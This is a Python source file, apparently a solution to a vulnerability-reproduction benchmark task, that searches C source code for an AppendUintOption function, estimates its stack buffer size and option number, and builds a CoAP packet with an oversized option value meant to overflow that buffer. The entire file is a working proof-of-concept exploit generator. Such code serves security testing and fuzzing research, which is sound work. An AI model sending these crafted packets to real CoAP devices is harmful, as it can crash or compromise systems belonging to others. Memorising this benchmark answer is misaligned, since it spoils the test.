import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                        if not os.path.isfile(p) or st.st_size > 2_000_000:
                            continue
                        with open(p, "rb") as f:
                            yield p, f.read()
                    except Exception:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield m.name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _build_symbol_map(self, files: List[Tuple[str, bytes]]) -> Dict[str, int]:
        mp: Dict[str, int] = {}
        define_re = re.compile(rb'^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+([0-9]+|0x[0-9A-Fa-f]+)\b', re.M)
        enum_assign_re = re.compile(rb'\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([0-9]+|0x[0-9A-Fa-f]+)\b')
        for _, b in files:
            if b is None:
                continue
            for m in define_re.finditer(b):
                try:
                    name = m.group(1).decode("ascii", "ignore")
                    val = int(m.group(2).decode("ascii", "ignore"), 0)
                    if 0 <= val <= 100000:
                        mp.setdefault(name, val)
                except Exception:
                    pass
            for m in enum_assign_re.finditer(b):
                try:
                    name = m.group(1).decode("ascii", "ignore")
                    val = int(m.group(2).decode("ascii", "ignore"), 0)
                    if 0 <= val <= 100000:
                        mp.setdefault(name, val)
                except Exception:
                    pass
        return mp

    def _find_append_uint_option_info(self, files: List[Tuple[str, bytes]], symmap: Dict[str, int]) -> Tuple[Optional[int], int]:
        opt_candidates: List[int] = []
        bufsize = 4

        call_re = re.compile(rb'AppendUintOption\s*\(\s*([A-Za-z_][A-Za-z0-9_]*|[0-9]+|0x[0-9A-Fa-f]+)\b')
        def_re = re.compile(rb'\bAppendUintOption\s*\([^;{]*\)\s*\{', re.M)
        arr_re = re.compile(rb'\b(?:uint8_t|char|unsigned\s+char|uint16_t|uint32_t|int8_t)\s+[A-Za-z_][A-Za-z0-9_]*\s*\[\s*(\d+)\s*\]')

        for _, b in files:
            if not b:
                continue
            if b.find(b"AppendUintOption") == -1:
                continue

            # Find calls
            for m in call_re.finditer(b):
                tok = m.group(1)
                try:
                    s = tok.decode("ascii", "ignore")
                    if s.startswith(("0x", "0X")) or s.isdigit():
                        v = int(s, 0)
                        if 0 <= v <= 2048:
                            opt_candidates.append(v)
                    else:
                        v = symmap.get(s)
                        if v is not None and 0 <= v <= 2048:
                            opt_candidates.append(v)
                except Exception:
                    pass

            # Find buffer size in definition
            dm = def_re.search(b)
            if dm:
                start = dm.end()
                snippet = b[start:start + 4000]
                sizes = []
                for am in arr_re.finditer(snippet):
                    try:
                        n = int(am.group(1))
                        if 1 <= n <= 4096:
                            sizes.append(n)
                    except Exception:
                        pass
                if sizes:
                    bs = min(sizes)
                    if 1 <= bs <= 4096:
                        bufsize = bs

        chosen_opt = None
        if opt_candidates:
            # prefer common uint options if present
            preferred = [7, 12, 14, 17, 23, 27, 28, 60]
            s = set(opt_candidates)
            for p in preferred:
                if p in s:
                    chosen_opt = p
                    break
            if chosen_opt is None:
                # choose smallest reasonable option number
                opt_candidates = [v for v in opt_candidates if 0 <= v <= 2048]
                if opt_candidates:
                    chosen_opt = min(opt_candidates)

        return chosen_opt, bufsize

    def _encode_ext(self, v: int) -> Tuple[int, bytes]:
        if v < 13:
            return v, b""
        if v < 269:
            return 13, bytes([v - 13])
        if v < 65805:
            x = v - 269
            return 14, bytes([(x >> 8) & 0xFF, x & 0xFF])
        # clamp to maximum representable
        x = 65804 - 269
        return 14, bytes([(x >> 8) & 0xFF, x & 0xFF])

    def _build_coap_poc(self, option_number: int, option_length: int) -> bytes:
        # CoAP header: ver=1, type=CON(0), TKL=4, code=GET(1), msgid=0
        tkl = 4
        first = (1 << 6) | (0 << 4) | (tkl & 0x0F)
        header = bytes([first, 0x01, 0x00, 0x00])
        token = b"ABCD"

        d_nib, d_ext = self._encode_ext(option_number)
        l_nib, l_ext = self._encode_ext(option_length)
        if d_nib == 15 or l_nib == 15:
            # should not happen due to encode_ext clamping
            d_nib, d_ext = 14, b"\x00\x00"
            l_nib, l_ext = 14, b"\x00\x00"

        opt_hdr = bytes([(d_nib << 4) | l_nib]) + d_ext + l_ext
        opt_val = b"A" * option_length
        return header + token + opt_hdr + opt_val

    def solve(self, src_path: str) -> bytes:
        files = list(self._iter_files(src_path))
        symmap = self._build_symbol_map(files)
        opt, bufsize = self._find_append_uint_option_info(files, symmap)

        if opt is None:
            opt = 7

        # Choose an option value length that is very likely to overflow any small stack buffer.
        # Keep it modest to avoid other unintended issues.
        target_len = 12
        if bufsize >= target_len:
            target_len = bufsize + 1
            if target_len < 12:
                target_len = 12
            if target_len > 64:
                target_len = 64

        return self._build_coap_poc(int(opt), int(target_len))